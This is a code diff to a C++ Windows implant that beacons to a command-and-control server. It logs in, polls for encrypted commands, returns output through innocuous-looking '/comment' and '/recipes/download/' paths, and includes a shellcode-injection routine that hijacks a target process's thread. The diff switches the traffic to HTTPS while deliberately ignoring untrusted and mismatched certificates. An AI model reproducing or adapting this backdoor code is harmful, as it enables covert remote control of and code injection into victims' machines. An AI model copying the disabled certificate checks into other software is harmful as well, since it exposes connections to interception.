@@ -39,7 +39,9 @@ HCRYPTKEY hKey = NULL;
 // 1. server_url
 // 2. encryption key
 
-std::wstring server_url = L"http://192.168.4.61"; // REPLACE THIS
+std::wstring server_url = L"https://192.168.4.61"; // REPLACE THIS
+std::wstring server_ip = L"192.168.4.61";
+INTERNET_PORT server_port = 443;
 
 enum REQ_TYPE {
     LOGIN,
@@ -60,16 +62,31 @@ std::string get_file(const wchar_t* file_id)
     hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     // Specify an HTTP server.
     if (hSession)
-        hConnect = WinHttpConnect(hSession, L"192.168.4.61", INTERNET_DEFAULT_HTTP_PORT, 0);
+        hConnect = WinHttpConnect(hSession, server_ip.c_str(), server_port, 0);
+
     // Make the right path for the file
     std::wstring path_to_file = L"/recipes/download/";
     path_to_file.append(file_id);
     // Create an HTTP request handle.
     if (hConnect)
-        hRequest = WinHttpOpenRequest(hConnect, L"GET", path_to_file.data(), NULL, WINHTTP_NO_REFERER, NULL, NULL);
+        hRequest = WinHttpOpenRequest(hConnect, L"GET", path_to_file.data(), NULL, WINHTTP_NO_REFERER, NULL, WINHTTP_FLAG_SECURE);
+    if (!hRequest) {
+        std::cout << GetLastError() << std::endl;
+    }
+    // Fix up the security flags to allow self-signed certs
+    DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags)))
+    {
+        // Handle error
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+    }
+
     // Send a request.
     if (hRequest)
         bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    
     // End the request.
     if (bResults)
         bResults = WinHttpReceiveResponse(hRequest, NULL);/**/
@@ -149,16 +166,27 @@ std::wstring http_req(const wchar_t* server_url, const char* post_body, const wc
     // Specify an HTTP server.
     if (hSession)
         hConnect = WinHttpConnect(hSession, hostName.c_str(),
-            components.nPort, 0);
+            server_port, 0);
 
     // Create an HTTP request handle.
     if (hConnect)
         hRequest = WinHttpOpenRequest(hConnect, GET_POST, components.lpszUrlPath,
             NULL, WINHTTP_NO_REFERER,
             WINHTTP_DEFAULT_ACCEPT_TYPES,
-            0);
+            WINHTTP_FLAG_SECURE);
 
     const char* RequestBody = post_body;
+
+    // Allow self signed certs
+    DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags)))
+    {
+        // Handle error
+        /*WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);*/
+        int do_nothing = 1;
+    }
 
     if (request_type == LOGIN) {
         bResults = WinHttpSendRequest(hRequest, NULL, NULL,
@@ -166,6 +194,9 @@ std::wstring http_req(const wchar_t* server_url, const char* post_body, const wc
             strlen(RequestBody),
             strlen(RequestBody),
             NULL);
+        if (!bResults) {
+            std::cout << GetLastError() << std::endl;
+        }
     }
     else if (name != NULL) {
         std::wstring sessid = L"Cookie: ";
@@ -176,7 +207,7 @@ std::wstring http_req(const wchar_t* server_url, const char* post_body, const wc
             strlen(RequestBody),
             NULL);
     }
-    
+
 
     // End the request.
     if (bResults)
@@ -187,10 +218,10 @@ std::wstring http_req(const wchar_t* server_url, const char* post_body, const wc
     // First, use WinHttpQueryHeaders to obtain the size of the buffer.
     if (bResults)
     {
-        
+
 
         if (request_type == LOGIN) {
-            
+
 
             wchar_t* cookie = NULL;
             DWORD dwSize = 0;
@@ -259,12 +290,12 @@ std::wstring http_req(const wchar_t* server_url, const char* post_body, const wc
 
             } while (dwSize > 0);
             return ret;
-            
+
         }
-        
+
     }
-    
-    
+
+
     // Close any open handles.
     if (hRequest) WinHttpCloseHandle(hRequest);
     if (hConnect) WinHttpCloseHandle(hConnect);
@@ -502,7 +533,7 @@ int main()
 
     NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
     OSVERSIONINFOEXW osInfo;
-        
+
     *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
 
     if (NULL != RtlGetVersion)
@@ -540,15 +571,15 @@ int main()
     REQ_TYPE lg = LOGIN;
     std::wstring l_url = server_url.data();
     l_url.append(L"/login");
-    
+
     std::wstring cookie;
-       
+
     // The login timer, exits once cookie is populated
     while (cookie.size() == 0) {
         cookie = http_req(l_url.data(), b64_login_msg.data(), L"POST", lg, NULL);
         Sleep(sleep_time);
     }
-            
+
     // Now get into the main loop
     while (1) {
         // Get a command
@@ -564,7 +595,7 @@ int main()
         if (to_decode.length() < 10) {
             int DO_NOTHING = 1;
         }
-        else{
+        else {
             // Need to cast to char - only sending over ascii / utf-8
             BYTE* raw = (BYTE*)cmd.data();
             std::string to_decode = (char*)raw;
@@ -577,7 +608,7 @@ int main()
 
             // Need to remove the 16 byte pad at the front...
             std::string plain = encrypted.substr(16, encrypted.length() - 1);
-     
+
             // Now need to split the string by the ::: delimiter
             std::vector<std::string> parsed_cmd = splitString(plain, ":::");
 
@@ -594,7 +625,7 @@ int main()
                 // append the command id first
                 exit_confirm.append(cmd_id.data());
                 exit_confirm.append(":::");
-                
+
                 // then the kill_id to confirm
                 exit_confirm.append(parsed_cmd[2]);
 
@@ -641,7 +672,7 @@ int main()
                 REQ_TYPE r = RESP;
                 std::wstring r_url = server_url.data();
                 r_url.append(L"/comment");
-                
+
                 std::wstring bak = http_req(r_url.data(), b64_out_msg.data(), L"POST", r, cookie.data());
             }
             // If shellcode-inject
@@ -695,8 +726,8 @@ int main()
 
                 snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                 Thread32First(snapshot, &threadEntry);
-                while (Thread32Next(snapshot, &threadEntry)){
-                if (threadEntry.th32OwnerProcessID == targetPID)
+                while (Thread32Next(snapshot, &threadEntry)) {
+                    if (threadEntry.th32OwnerProcessID == targetPID)
                     {
                         threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
                         break;
